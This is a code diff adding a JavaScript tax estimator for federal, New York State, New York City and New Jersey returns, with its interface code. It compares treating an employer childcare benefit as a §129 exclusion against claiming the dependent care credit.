+  const ctcNonRef = Math.min(ctcFull, afterCdcc);
+  const earnedIncome = wages + benefitTaxable + seProfit;
+  const ctcRefundable = ctcKids > 0
+    ? Math.min(pos(ctcFull - ctcNonRef),
+               ctcKids * FED.ctcRefundableMax,
+               pos(earnedIncome - FED.ctcEarnedIncomeFloor) * FED.ctcRefundableRate)
+    : 0;
+
+  // --- EITC ---
+  const eitc = calcEitc(earnedIncome, agi, D.children, st, D.investmentIncome);
+
+  const taxAfter = pos(taxBefore - cdcc - ctcNonRef);
+  const refund = ctcRefundable + eitc + D.whFed - taxAfter - seTax;
+
+  return { wages, benefitTaxable, exclusion, seProfit, seTax, seDeduction, addlFica,
+           grossIncome, agi, deduction, taxable, taxBefore,
+           cdcc, cdccBase, cdccRate, ctcFull, ctcNonRef, ctcRefundable, eitc,
+           taxAfter, refund, earnedIncome };
+}
+
+function fedCdccRate(agi, st) {
+  const c = FED.cdcc;
+  const p1 = c.phase1Start[st], p2 = c.phase2Start[st];
+  if (agi <= p1) return c.topRate;
+  if (agi <= p2) return Math.max(c.midRate, c.topRate - Math.ceil((agi - p1) / 2000) * .01);
+  return Math.max(c.floorRate, c.midRate - Math.ceil((agi - p2) / 2000) * .01);
+}
+
+function calcEitc(earned, agi, children, st, investmentIncome) {
+  if ((investmentIncome || 0) > FED.eitc.investmentIncomeLimit) return 0;
+  if (st === 'mfs') return 0;
+  const qc = children.filter(c => c.age < 19 || (c.student && c.age < 24)).length;
+  const p = FED.eitc.byChildren[Math.min(qc, 3)];
+  const credit = Math.min(earned * p.inRate, p.max);
+  const poStart = st === 'mfj' ? p.poBeginMfj : p.poBegin;
+  const test = Math.max(earned, agi);
+  return pos(Math.min(credit, p.max - pos(test - poStart) * p.outRate));
+}
+
+/* ---- NEW YORK STATE ---- */
+
+function calcNYS(D, F) {
+  const st = D.status;
+  const nyagi = F.agi;                       // no NY additions/subtractions modelled
+  const std = FED.stdDeduction ? NYS.stdDeduction[st] : 0;
+  const deps = D.children.length * NYS.dependentExemption;
+  const taxable = pos(nyagi - NYS.stdDeduction[st] - deps);
+
+  const tableTax = taxFromBaseTable(taxable, NYS.brackets[st]);
+  const supplemental = nysRecapture(nyagi, taxable, st, tableTax);
+  const taxBefore = tableTax + supplemental;
+
+  // IT-213 Empire State Child Credit
+  let escc = 0;
+  for (const c of D.children) {
+    if (c.age < 4) escc += NYS.escc.under4;
+    else if (c.age < 17) escc += NYS.escc.age4to16;
+  }
+  const eStart = NYS.escc.phaseoutStart[st] !== undefined
+               ? NYS.escc.phaseoutStart[st] : NYS.escc.phaseoutStart.single;
+  const eOver = pos(Math.floor(F.agi / 1000) * 1000 - eStart);
+  if (eOver > 0) escc = pos(escc - (eOver / 1000) * NYS.escc.reductionPer1000);
+
+  // IT-216 New York child & dependent care credit
+  const nyCdcc = calcNyCdcc(D, F, nyagi);
+
+  // IT-215 New York State EIC — 30% of federal, reduced by household credit
+  const nysEic = pos(F.eitc * NYS.eicRate - 0);   // household credit not modelled
+
+  const taxAfter = pos(taxBefore - nyCdcc.nonrefundablePortion);
+  const refundable = escc + nysEic + nyCdcc.refundablePortion;
+  const refund = refundable + D.whState - taxAfter;
+
+  return { nyagi, taxable, tableTax, supplemental, taxBefore, escc, nysEic,
+           nyCdcc: nyCdcc.credit, taxAfter, refund };
+}
+
+function nysRecapture(nyagi, taxable, st, tableTax) {
+  if (nyagi <= NYS.recaptureThreshold) return 0;
+  const R = NYS.recapture[st];
+  if (nyagi > 25000000) return pos(taxable * .1090 - tableTax);
+
+  // Taxable income below the first band while AGI is still over the threshold
+  const firstBand = R.bands[0];
+  if (taxable < firstBand.tiMin) {
+    const frac = Math.min(1, pos(nyagi - NYS.recaptureThreshold) / 50000);
+    return pos((taxable * R.flatRate - tableTax) * frac);
+  }
+  for (const b of R.bands) {
+    if (taxable > b.tiMin && taxable <= b.tiMax) {
+      const frac = Math.min(50000, pos(nyagi - b.agiRef)) / 50000;
+      return b.base + b.incr * frac;
+    }
+  }
+  const last = R.bands[R.bands.length - 1];
+  return last.base + last.incr;
+}
+
+function calcNyCdcc(D, F, nyagi) {
+  // Same Pub 503 rule: the cap follows persons with expenses actually paid.
+  const kids = D.children.filter(c => c.age < 13 && (c.care||0) > 0);
+  if (!kids.length) return { credit:0, nonrefundablePortion:0, refundablePortion:0, base:0 };
+  const paid = kids.reduce((s,c) => s + (c.care||0), 0);
+  const cap = NYS.cdcc.expenseCapByCount[Math.min(kids.length, 5)];
+  // NY Worksheet 1 line 14: cap less EXCLUDED benefits (NY still uses $5,000)
+  const nyExclusion = Math.min(F.exclusion,
+    D.status === 'mfs' ? NYS.cdcc.exclusionCap.mfs : NYS.cdcc.exclusionCap.standard);
+  const base = Math.min(paid, pos(cap - nyExclusion));
+  if (base <= 0) return { credit:0, nonrefundablePortion:0, refundablePortion:0, base:0 };
+  let rate = NYS.cdcc.rateTable[NYS.cdcc.rateTable.length-1][1];
+  for (const [lim, rt] of NYS.cdcc.rateTable) { if (F.agi <= lim) { rate = rt; break; } }
+  const credit = base * rate * nysCdccLimit(nyagi);
+  return { credit, base, nonrefundablePortion:0, refundablePortion:credit };  // NY credit is refundable
+}
+
+/* ---- NEW YORK CITY ---- */
+
+function calcNYC(D, F, S) {
+  if (!D.nycResident) return null;
+  const st = D.status;
+  const taxable = S.taxable;
+  const taxBefore = taxFromBaseTable(taxable, NYC.brackets[st]);
+
+  // School tax credit — fixed amount
+  let stcFixed = 0;
+  if (F.agi <= NYC.stcIncomeLimit)
+    stcFixed = (st === 'mfj') ? NYC.stcFixed.mfj : NYC.stcFixed.other;
+
+  // School tax credit — rate reduction amount
+  let stcRate = 0;
+  if (F.agi <= NYC.stcRateReductionCeiling) {
+    const c = NYC.stcRateReduction[st];
+    stcRate = taxable <= c.threshold
+      ? taxable * c.lowRate
+      : c.base + (taxable - c.threshold) * c.highRate;
+  }
+
+  // NYC EIC
+  let nycRate = NYC.eicTable[NYC.eicTable.length-1][1];
+  for (const [lim, rt] of NYC.eicTable) { if (S.nyagi <= lim) { nycRate = rt; break; } }
+  const nycEic = F.eitc * nycRate;
+
+  // NYC child care credit — under 4 only, FAGI cap
+  let nycCdcc = 0;
+  const under4 = D.children.filter(c => c.age < NYC.cdcc.ageLimit);
+  if (under4.length && F.agi <= NYC.cdcc.fagiLimit && S.nyCdcc > 0) {
+    const paidUnder4 = under4.reduce((s,c) => s + (c.care||0), 0);
+    const paidAll = D.children.reduce((s,c) => s + (c.care||0), 0);
+    const ratio = paidAll > 0 ? Math.min(1, paidUnder4 / paidAll) : 0;
+    nycCdcc = S.nyCdcc * ratio * nycCdccLimit(F.agi);
+  }
+
+  const taxAfter = pos(taxBefore);
+  const refundable = stcFixed + stcRate + nycEic + nycCdcc;
+  const refund = refundable + D.whLocal - taxAfter;
+
+  return { taxable, taxBefore, stcFixed, stcRate, nycEic, nycCdcc, taxAfter, refund };
+}
+
+/* ---- NEW JERSEY ---- */
+
+function calcNJ(D, F) {
+  const st = D.status;
+
+  // NJ wages = Box 16. The §129 exclusion does NOT reduce NJ wages.
+  const njWages = D.wagesTP + D.wagesSP + (F.exclusion || 0) + F.benefitTaxable;
+  const seProfit = pos(D.necTP - D.expTP) + pos(D.necSP - D.expSP);
+  const grossIncome = njWages + seProfit;
+
+  // Exemptions
+  let ex = NJ.exemption.personal;
+  if (st === 'mfj') ex += NJ.exemption.personal;
+  if (D.taxpayer65) ex += NJ.exemption.senior;
+  if (st === 'mfj' && D.spouse65) ex += NJ.exemption.senior;
+  ex += D.children.length * NJ.exemption.dependentChild;
+
+  const taxable = pos(grossIncome - ex);
+  const belowThreshold = grossIncome <= NJ.filingThreshold[st];
+  const taxBefore = belowThreshold ? 0 : taxFromSubtractTable(taxable, NJ.brackets[st]);
+
+  // NJ EITC — 40% of federal
+  const njEitc = F.eitc * NJ.eitcRate;
+
+  // NJ Child Tax Credit — refundable, age 5 or younger
+  let njCtc = 0;
+  const young = D.children.filter(c => c.age <= NJ.ctc.ageLimit).length;
+  if (young && st !== 'mfs') {
+    let per = 0;
+    for (const [lim, amt] of NJ.ctc.tiers) { if (taxable <= lim) { per = amt; break; } }
+    njCtc = young * per;
+  }
+
+  // NJ Child & Dependent Care Credit — % of federal credit, refundable
+  let njCdcc = 0;
+  if (taxable <= NJ.cdcc.incomeLimit && F.cdcc > 0) {
+    let pct = 0;
+    for (const [lim, p] of NJ.cdcc.tiers) { if (taxable <= lim) { pct = p; break; } }
+    njCdcc = F.cdcc * pct;
+  }
+
+  const taxAfter = pos(taxBefore);
+  const refundable = njEitc + njCtc + njCdcc;
+  const refund = refundable + D.whState - taxAfter;
+
+  return { njWages, grossIncome, exemptions: ex, taxable, taxBefore,
+           njEitc, njCtc, njCdcc, taxAfter, refund, belowThreshold };
+}
+
+/* ---- TOP LEVEL ---- */
+
+function calculate(D) {
+  const F = calcFederal(D);
+  let S = null, C = null, J = null;
+  if (D.state === 'NY') {
+    S = calcNYS(D, F);
+    C = calcNYC(D, F, S);
+  } else {
+    J = calcNJ(D, F);
+  }
+  const stateRefund = S ? S.refund : (J ? J.refund : 0);
+  const cityRefund  = C ? C.refund : 0;
+  const combined = F.refund + stateRefund + cityRefund;
+  return { F, S, C, J, stateRefund, cityRefund, combined,
+           addlFica: F.addlFica };
+}
+
+/* ---- BENEFIT COMPARISON ----
+   Runs the return three ways so the cost box and the two option cards can be
+   filled from one place:
+     base      no employer benefit at all
+     exclusion benefit taken, up to the §129 limit excluded
+     credit    benefit fully taxable, childcare credit claimed instead
+   Cost of an option = (refund lost vs base) + (additional FICA it triggers).   */
+function compareBenefit(D) {
+  const base      = calculate(Object.assign({}, D, { includeBenefit:false, benefit:0, takeExclusion:false }));
+  const exclusion = calculate(Object.assign({}, D, { includeBenefit:true,  takeExclusion:true  }));
+  const credit    = calculate(Object.assign({}, D, { includeBenefit:true,  takeExclusion:false }));
+
+  const pack = (R) => ({
+    R,
+    refundAfter: R.combined,
+    addlFica: R.addlFica,
+    cost: (base.combined - R.combined) + R.addlFica
+  });
+
+  const A = pack(exclusion), B = pack(credit);
+  const gross = D.benefit || 0;
+  A.netBenefit = gross - A.cost;
+  B.netBenefit = gross - B.cost;
+  return { base, refundBefore: base.combined, gross,
+           exclusion: A, credit: B,
+           recommended: A.cost <= B.cost ? 'exclusion' : 'credit' };
+}
+
+/* ==========================================================================
+   APPLICATION CONTROLLER  v2
+   ========================================================================== */
+
+const $ = id => document.getElementById(id);
+function commas(n){
+  const s = String(Math.abs(Math.round(n || 0)));
+  return s.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+}
+const usd  = n => (n < 0 ? '-' : '') + '$' + commas(n);
+const usdp = n => '$' + commas(n);   // no sign
+const money = el => Number(String(el.value).replace(/[^0-9.]/g, '')) || 0;
+const setMoney = (el, v) => { el.value = commas(v); };
+
+const DEFAULTS = {
+  status:'mfj', state:'NY', nycRes:true, incBenefit:false, locked:false,
+  kids:[{age:5,care:3000,student:false},{age:3,care:3000,student:false},{age:8,care:0,student:false}],
+  fields:{ lastName:'',tpFirst:'',spFirst:'',addr:'',city:'',stateAbbr:'NY',zip:'',
+           email:'',phoneHome:'',phoneMobile:'',
+           wagesTP:'18,000',wagesSP:'7,500',necTP:'0',necSP:'0',expTP:'0',expSP:'0',
+           pretax:'0',investInc:'0',whFed:'0',whState:'0',whLocal:'0',benefit:'24,000' }
+};
+
+let STATUS = 'mfj', STATE = 'NY', LOCKED = false, SELECTED = 'exclusion';
+let KIDS = DEFAULTS.kids.map(function(k){ return Object.assign({}, k); });
+const MAX_KIDS = 12;
+
+/* ---------- watermark ---------- */
+function paintWatermark(){
+  const src = $('lgImg').src || LOGO_FALLBACK;
+  $('wm').style.backgroundImage = 'url("' + src + '")';
+}
+
+/* ---------- typed validation ---------- */
+const RULES = {
+  name:  { test: v => v.trim().length >= 1 && /^[A-Za-z][A-Za-z' .-]*$/.test(v.trim()),
+           msg: 'Letters only' },
+  text:  { test: v => v.trim().length >= 3, msg: 'Too short' },
+  state: { test: v => /^[A-Za-z]{2}$/.test(v.trim()), msg: 'Two letters' },
+  zip:   { test: v => /^\d{5}(-\d{4})?$/.test(v.trim()), msg: 'Five digits' },
+  email: { test: v => /^[^\s@]+@[^\s@]+\.[A-Za-z]{2,}$/.test(v.trim()), msg: 'Not a valid email' },
+  phone: { test: v => /^\d{3}-\d{3}-\d{4}$/.test(v.trim()), msg: 'Ten digits' },
+  phoneOpt:{ test: v => v.trim()==='' || /^\d{3}-\d{3}-\d{4}$/.test(v.trim()), msg: 'Ten digits' }
+};
+
+function isRequired(id){
+  if (id === 'spFirst')    return STATUS === 'mfj';
+  if (id === 'phoneHome')  return false;
+  return ['lastName','tpFirst','addr','city','stateAbbr','zip','email','phoneMobile'].includes(id);
+}
+
+function checkField(el, showEmpty){
+  const kind = el.dataset.v; if (!kind) return true;
+  const msgEl = el.parentElement.querySelector('.fldmsg');
+  const val = el.value;
+  const req = isRequired(el.id);
+  el.classList.remove('err','ok');
+  if (msgEl) msgEl.textContent = '';
+
+  if (!val.trim()){
+    if (req && showEmpty){ el.classList.add('err'); if(msgEl) msgEl.textContent='Required'; return false; }
+    return !req;
+  }
+  const ok = RULES[kind].test(val);
+  if (!ok){ el.classList.add('err'); if(msgEl) msgEl.textContent = RULES[kind].msg; return false; }
+  el.classList.add('ok');
+  return true;
+}
+
+/* phone auto-dash */
+function formatPhone(el){
+  const d = el.value.replace(/\D/g,'').slice(0,10);
+  el.value = d.length > 6 ? `${d.slice(0,3)}-${d.slice(3,6)}-${d.slice(6)}`
+           : d.length > 3 ? `${d.slice(0,3)}-${d.slice(3)}` : d;
+}
+
+/* ---------- zip intelligence ---------- */
+const NYC_ZIP_RANGES = [[10001,10292],[10301,10314],[10451,10475],
+                        [11004,11109],[11201,11256],[11351,11697]];
+function zipInfo(z){
+  const n = parseInt(String(z).slice(0,5), 10);
+  if (isNaN(n)) return null;
+  const nyc = NYC_ZIP_RANGES.some(([a,b]) => n>=a && n<=b);
+  let st = null;
+  if (n>=10001 && n<=14975) st='NY';
+  else if (n>=7001 && n<=8989) st='NJ';
+  return { state: st, nyc };
+}
+function applyZip(){
+  const raw = $('zip').value;
+  const info = zipInfo(raw);
+  if (!info || !info.state) return;
+
+  $('stateAbbr').value = info.state;
+  checkField($('stateAbbr'), false);
+
+  const seg = info.state === 'NY' ? 'NY' : 'NJ';
+  if (STATE !== seg){
+    STATE = seg;
+    $('segState').querySelectorAll('button').forEach(b=>b.classList.toggle('on', b.dataset.v===seg));
+    syncState();
+  }
+  if (info.state === 'NY') $('nycRes').checked = info.nyc;
+
+  // City fills only where the USPS name is known (NYC). Elsewhere it is left
+  // alone so nothing wrong lands on a return. Always editable either way.
+  const city = zipToCity(raw);
+  if (city){ $('city').value = city; checkField($('city'), false); }
+
+  run();
+}
+
+/* ---------- children ---------- */
+function renderKids(){
+  const box = $('kidList'); box.innerHTML = '';
+  KIDS.forEach((k,i)=>{
+    const d = document.createElement('div'); d.className = 'kid';
+    d.innerHTML = `<span class="lbl">Child ${i+1}</span>
+      <input type="number" min="0" max="26" value="${k.age}" data-i="${i}" data-f="age">
+      <input type="text" class="money" value="${commas(k.care)}" data-i="${i}" data-f="care">
+      <span class="stu"><input type="checkbox" data-i="${i}" data-f="student" ${k.student?'checked':''}>student</span>
+      <button class="x" data-del="${i}" title="Remove">&times;</button>`;
+    box.appendChild(d);
+  });
+  box.querySelectorAll('input').forEach(inp=>{
+    inp.addEventListener('input', e=>{
+      const i = +e.target.dataset.i, f = e.target.dataset.f;
+      if (f==='student') KIDS[i].student = e.target.checked;
+      else if (f==='age') KIDS[i].age = Math.max(0, Math.min(26, +e.target.value||0));
+      else KIDS[i].care = Number(String(e.target.value).replace(/[^0-9]/g,''))||0;
+      run();
+    });
+  });
+  box.querySelectorAll('[data-del]').forEach(b=>b.addEventListener('click',e=>{
+    KIDS.splice(+e.currentTarget.dataset.del,1); renderKids(); run();
+  }));
+  $('addKid').disabled = KIDS.length >= MAX_KIDS;
+  $('addKid').textContent = KIDS.length >= MAX_KIDS
+    ? `Maximum ${MAX_KIDS} children` : '+ Add child';
+}
+$('addKid').addEventListener('click',()=>{
+  if (KIDS.length >= MAX_KIDS) return;
+  KIDS.push({age:5,care:0,student:false}); renderKids(); run();
+});
+
+/* ---------- segmented controls ---------- */
+function seg(id, cb){
+  $(id).querySelectorAll('button').forEach(b=>b.addEventListener('click',()=>{
+    $(id).querySelectorAll('button').forEach(x=>x.classList.remove('on'));
+    b.classList.add('on'); cb(b.dataset.v);
+  }));
+}
+seg('segStatus', v=>{ STATUS=v; syncStatus(); syncTotal(); run(); });
+seg('segState',  v=>{ STATE=v;  syncState();  run(); });
+
+function syncStatus(){
+  const married = STATUS==='mfj';
+  ['spWageRow','spNecRow','spExpRow','sp65Row'].forEach(id=>{
+    const el=$(id); if(el) el.style.opacity = married?1:.45;
+  });
+  $('spFirst').disabled = !married;
+  $('spReq').style.display = married?'inline':'none';
+  if(!married){
+    setMoney($('wagesSP'),0); setMoney($('necSP'),0); setMoney($('expSP'),0);
+    $('sp65').checked=false;
+  }
+  checkField($('spFirst'), false);
+}
+function syncState(){
+  $('nycRow').style.display = STATE==='NY'?'flex':'none';
+}
+
+/* ---------- total income lock ---------- */
+function incomeTotal(){
+  return money($('wagesTP')) + money($('wagesSP')) + money($('necTP')) + money($('necSP'));
+}
+function syncTotal(){
+  if (!LOCKED) setMoney($('totalIncome'), incomeTotal());
+}
+$('lockBtn').addEventListener('click', ()=>{
+  LOCKED = !LOCKED;
+  $('lockBtn').classList.toggle('on', LOCKED);
+  $('lockBtn').textContent = LOCKED ? 'Locked' : 'Unlocked';
+  $('totalIncome').disabled = !LOCKED;
+  $('totalHint').textContent = LOCKED
+    ? 'Locked. Type a total and it splits automatically — the first $7,500 to the spouse, '
+      + 'the rest to the taxpayer. Adjusting any box rebalances the others to hold this total.'
+    : 'Adds up the boxes below. Lock it to type a total instead — the first $7,500 goes to '
+      + 'the spouse and the rest to the taxpayer, and the boxes stay balanced as you adjust them.';
+  if (LOCKED) splitTotal(); else syncTotal();
+  run();
+});
+
+function splitTotal(){
+  const tot = money($('totalIncome'));
+  if (STATUS !== 'mfj'){
+    setMoney($('wagesTP'), Math.max(0, tot - money($('necTP')) - money($('necSP'))));
+    setMoney($('wagesSP'), 0);
+    return;
+  }
+  const spouseShare = Math.min(7500, tot);
+  setMoney($('wagesSP'), Math.max(0, spouseShare - money($('necSP'))));
+  setMoney($('wagesTP'), Math.max(0, tot - spouseShare - money($('necTP'))));
+}
+
+/* When locked, changing one income box rebalances the counterpart so the total holds. */
+function rebalance(changedId){
+  if (!LOCKED) { syncTotal(); return; }
+  const tot = money($('totalIncome'));
+  const tpSide = ['wagesTP','necTP'], spSide = ['wagesSP','necSP'];
+
+  if (spSide.includes(changedId)){
+    // spouse side moved — absorb inside spouse first, then adjust taxpayer W-2
+    if (changedId === 'necSP'){
+      const spTotal = money($('wagesSP')) + money($('necSP'));
+      const target  = Math.min(7500, tot);
+      setMoney($('wagesSP'), Math.max(0, target - money($('necSP'))));
+    }
+    const spTotal = money($('wagesSP')) + money($('necSP'));
+    setMoney($('wagesTP'), Math.max(0, tot - spTotal - money($('necTP'))));
+  } else {
+    if (changedId === 'necTP'){
+      const tpTarget = Math.max(0, tot - money($('wagesSP')) - money($('necSP')));
+      setMoney($('wagesTP'), Math.max(0, tpTarget - money($('necTP'))));
+    } else {
+      const tpTotal = money($('wagesTP')) + money($('necTP'));
+      const spTarget = Math.max(0, tot - tpTotal);
+      setMoney($('wagesSP'), Math.max(0, spTarget - money($('necSP'))));
+    }
+  }
+}
+
+/* ---------- benefit toggle & option selection ---------- */
+$('incBenefit').addEventListener('change',()=>{
+  const on = $('incBenefit').checked;
+  $('benefitRow').style.display = on?'block':'none';
+  $('costBox').style.display    = on?'grid':'none';
+  $('cmpWrap').style.display    = on?'grid':'none';
+  run();
+});
+['optA','optB'].forEach(id=>{
+  $(id).addEventListener('click', ()=>{ SELECTED = $(id).dataset.opt; run(); });
+});
+
+/* ---------- gather ---------- */
+function gather(takeExclusion){
+  const incB = $('incBenefit').checked;
+  return {
+    status: STATUS, state: STATE, nycResident: STATE==='NY' && $('nycRes').checked,
+    wagesTP: money($('wagesTP')), wagesSP: STATUS==='mfj'?money($('wagesSP')):0,
+    necTP: Math.min(SE_INCOME_CAP, money($('necTP'))),
+    necSP: STATUS==='mfj'?Math.min(SE_INCOME_CAP, money($('necSP'))):0,
+    expTP: money($('expTP')), expSP: STATUS==='mfj'?money($('expSP')):0,
+    pretax: money($('pretax')), investmentIncome: money($('investInc')),
+    whFed: money($('whFed')), whState: money($('whState')), whLocal: money($('whLocal')),
+    includeBenefit: incB, benefit: incB?money($('benefit')):0,
+    takeExclusion: takeExclusion,
+    spouseStudentDisabled: false,
+    taxpayer65: $('tp65').checked, spouse65: $('sp65').checked,
+    children: KIDS.map(k=>({age:k.age, care:k.care, student:k.student}))
+  };
+}
+
+/* ---------- 1099 cap guard ---------- */
+function capGuard(el){
+  el.addEventListener('blur',()=>{
+    if (money(el) > SE_INCOME_CAP){
+      setMoney(el, SE_INCOME_CAP);
+      alert('Self-employment income above ' + usdp(SE_INCOME_CAP) +
+        ' may trigger the Metropolitan Commuter Transportation Mobility Tax (MCTMT), which '+
+        'this calculator does not compute.\n\nThe entry has been capped. Prepare this return manually.');
+      run();
+    }
+  });
+}
+capGuard($('necTP')); capGuard($('necSP'));
+
+/* ==========================================================================
+   RENDER
+   ========================================================================== */
+
+function row(tb, label, vals, cls){
+  const tr = tb.insertRow(); tr.className = cls||'';
+  tr.insertCell().textContent = label;
+  vals.forEach(v=>{
+    const c = tr.insertCell(); c.className='n';
+    c.textContent = (v===null || v===undefined) ? '' : (typeof v==='number' ? usd(v) : v);
+    if (typeof v==='number' && cls==='tot') c.classList.add(v>=0?'pos':'neg');
+  });
+  return tr;
+}
+function sect(tb, label, span){ const tr=tb.insertRow(); tr.className='sec';
+  const c=tr.insertCell(); c.colSpan=span; c.textContent=label; }
+
+function buildBreakdown(tb, A, B, twoCol){
+  tb.innerHTML='';
+  const span = twoCol ? 3 : 2;
+  const g = (o, path) => { try { return path(o); } catch(e){ return 0; } };
+  const pair = (fn) => twoCol ? [fn(A), fn(B)] : [fn(A)];
+
+  if (twoCol){
+    const tr = tb.insertRow(); tr.className='hdr';
+    tr.insertCell().textContent='Line item';
+    const c1=tr.insertCell(); c1.className='n'; c1.innerHTML='Before<br>benefits';
+    const c2=tr.insertCell(); c2.className='n';
+    c2.innerHTML = 'With benefits<small>' +
+      (SELECTED==='exclusion' ? '(&sect;129)' : '(taxable)') + '</small>';
+  }
+
+  sect(tb,'Federal',span);
+  row(tb,'Taxable wages', pair(R=>R.F.wages + R.F.benefitTaxable));
+  if (twoCol && B.F.exclusion) row(tb,'Excluded under §129', [null, -B.F.exclusion],'sub');
+  if (A.F.seProfit || (twoCol&&B.F.seProfit)) row(tb,'Net self-employment profit', pair(R=>R.F.seProfit));
+  row(tb,'Adjusted gross income', pair(R=>R.F.agi));
+  row(tb,'Taxable income', pair(R=>R.F.taxable));
+  row(tb,'Tax before credits', pair(R=>R.F.taxBefore));
+  row(tb,'Dependent care credit', pair(R=>-R.F.cdcc),'sub');
+  row(tb,'Nonrefundable child tax credit', pair(R=>-R.F.ctcNonRef),'sub');
+  row(tb,'Refundable child tax credit', pair(R=>-R.F.ctcRefundable),'sub');
+  row(tb,'Earned income credit', pair(R=>-R.F.eitc),'sub');
+  row(tb,'Federal withholding', pair(()=>-money($('whFed'))),'sub');
+  row(tb,'Federal refund (or tax due)', pair(R=>R.F.refund),'tot');
+
+  if (twoCol || A.F.seTax || A.F.addlFica){
+    sect(tb,'Payroll',span);
+    if (twoCol) row(tb,'Additional Social Security & Medicare (7.65%)',
+                    [ -A.F.addlFica, -B.F.addlFica ]);
+    if (A.F.seTax) row(tb,'Self-employment tax', pair(R=>-R.F.seTax));
+  }
+
+  if (A.S){
+    sect(tb,'New York State',span);
+    row(tb,'NY taxable income', pair(R=>R.S.taxable));
+    row(tb,'State tax before credits', pair(R=>R.S.tableTax));
+    if (A.S.supplemental || (twoCol&&B.S.supplemental))
+      row(tb,'Tax benefit recapture §601(d-5)', pair(R=>R.S.supplemental),'sub');
+    row(tb,'Empire State child credit', pair(R=>-R.S.escc),'sub');
+    row(tb,'NY dependent care credit', pair(R=>-R.S.nyCdcc),'sub');
+    row(tb,'NYS earned income credit', pair(R=>-R.S.nysEic),'sub');
+    row(tb,'State withholding', pair(()=>-money($('whState'))),'sub');
+    row(tb,'NYS refund (or tax due)', pair(R=>R.S.refund),'tot');
+  }
+  if (A.C){
+    sect(tb,'New York City',span);
+    row(tb,'City tax before credits', pair(R=>R.C.taxBefore));
+    row(tb,'School tax credit', pair(R=>-(R.C.stcFixed+R.C.stcRate)),'sub');
+    row(tb,'NYC earned income credit', pair(R=>-R.C.nycEic),'sub');
+    row(tb,'NYC dependent care credit', pair(R=>-R.C.nycCdcc),'sub');
+    row(tb,'Local withholding', pair(()=>-money($('whLocal'))),'sub');
+    row(tb,'NYC refund (or tax due)', pair(R=>R.C.refund),'tot');
+  }
+  if (A.J){
+    sect(tb,'New Jersey',span);
+    row(tb,'NJ wages (W-2 box 16)', pair(R=>R.J.njWages));
+    row(tb,'Less exemptions', pair(R=>-R.J.exemptions),'sub');
+    row(tb,'NJ taxable income', pair(R=>R.J.taxable));
+    row(tb, A.J.belowThreshold ? 'Below filing threshold — no tax' : 'Tax from rate schedule',
+        pair(R=>R.J.taxBefore));
+    row(tb,'NJ earned income tax credit (40%)', pair(R=>-R.J.njEitc),'sub');
+    row(tb,'NJ child tax credit', pair(R=>-R.J.njCtc),'sub');
+    row(tb,'NJ dependent care credit', pair(R=>-R.J.njCdcc),'sub');
+    row(tb,'State withholding', pair(()=>-money($('whState'))),'sub');
+    row(tb,'NJ refund (or tax due)', pair(R=>R.J.refund),'tot');
+  }
+
+  sect(tb,'Bottom line',span);
+  row(tb,'Net combined refund (or tax due)', pair(R=>R.combined),'tot');
+}
+
+function costLines(host, K, sel){
+  const S = sel==='exclusion' ? K.exclusion : K.credit;
+  host.innerHTML = '';
+  const add = (label, val, cls) => {
+    const d=document.createElement('div'); d.className='cl '+(cls||'');
+    d.innerHTML = '<span>'+label+'</span><span>'+val+'</span>'; host.appendChild(d);
+  };
+  add('Tax refund before childcare benefit', usd(K.refundBefore), 'g');
+  add('Tax refund after childcare benefit',  usd(S.refundAfter),  'g');
+  add('Additional Social Security &amp; Medicare tax', '-'+usdp(S.addlFica), 'r');
+  add('Net cost of benefit to employee', '-'+usdp(S.cost), 'r');
+  add('Gross benefit to employee', usd(K.gross), 'g');
+  add('Net benefit to employee', usd(S.netBenefit), 'fin');
+}
+
+function run(){
+  const incB = $('incBenefit').checked;
+  syncTotal();
+
+  // "Before benefits" must leave the benefit out altogether — not merely treat it
+  // as taxable. compareBenefit() already builds that baseline, so reuse it.
+  let A, K = null, B;
+  if (incB){
+    K = compareBenefit(gather(true));
+    A = K.base;
+    B = (SELECTED==='exclusion' ? K.exclusion.R : K.credit.R);
+  } else {
+    A = calculate(gather(false));
+    B = A;
+  }
+
+  const SHOW = incB ? B : A;
+
+  // hero
+  $('heroBig').textContent = usd(SHOW.combined);
+  $('heroCap').textContent = SHOW.combined >= 0
+    ? 'Estimated combined refund' : 'Estimated combined balance due';
+  $('stFed').textContent   = usd(SHOW.F.refund);
+  $('stState').textContent = usd(SHOW.stateRefund);
+  $('stStateWrap').firstChild.textContent = STATE==='NY'?'New York State':'New Jersey';
+  $('stCityWrap').style.display = SHOW.C ? 'block':'none';
+  if (SHOW.C) $('stCity').textContent = usd(SHOW.cityRefund);
+  $('stSeWrap').style.display = SHOW.F.seTax ? 'block':'none';
+  $('stSe').textContent = usd(SHOW.F.seTax);
+
+  const noWH = !money($('whFed')) && !money($('whState')) && !money($('whLocal'));
+  $('heroDisc').innerHTML = noWH
+    ? 'Federal, state and local tax withheld are all set to $0. Tax is normally withheld on a '
+      + 'W-2, and entering those amounts from boxes 2, 17 and 19 will increase this estimate.'
+    : 'Includes the federal, state and local tax withheld you entered.';
+
+  // cost box + option cards
+  if (incB && K){
+    const S = SELECTED==='exclusion' ? K.exclusion : K.credit;
+    $('cbAmt').textContent = usdp(S.cost);
+    $('cbExp').innerHTML = 'in new income, Social Security &amp; Medicare tax on your '
+                         + usdp(K.gross) + ' benefit';
+    costLines($('cbLines'), K, SELECTED);
+
+    const cap = FED.dcapExclusion[STATUS];
+    $('optAh').textContent = 'Take ' + usdp(cap) + ' tax-free';
+    const actual = K.exclusion.R.F.exclusion;
+    $('optAtxt').innerHTML = actual < cap
+      ? 'Only ' + usdp(actual) + ' can be excluded here &mdash; §129 caps the exclusion at the '
+        + 'lower-earning spouse&rsquo;s earned income. You also give up the childcare credit on that money.'
+      : 'Up to ' + usdp(cap) + ' of your benefit skips income tax and Social Security &amp; Medicare '
+        + 'tax. The trade-off: you can&rsquo;t also claim the childcare tax credit on that money at tax time.';
+
+    $('amtA').textContent = usdp(K.exclusion.cost);
+    $('amtB').textContent = usdp(K.credit.cost);
+    $('optA').classList.toggle('sel', SELECTED==='exclusion');
+    $('optB').classList.toggle('sel', SELECTED==='credit');
+    $('tagA').style.display = K.recommended==='exclusion' ? 'block':'none';
+    $('tagB').style.display = K.recommended==='credit'    ? 'block':'none';
+  }
+
+  buildBreakdown($('bd').tBodies[0], A, B, incB);
+
+  // flags
+  const flags = [];
+  if (FED.eitc.UNVERIFIED && SHOW.F.eitc>0)
+    flags.push('Earned income credit uses 2026 parameters pending confirmation against the published IRS tables.');
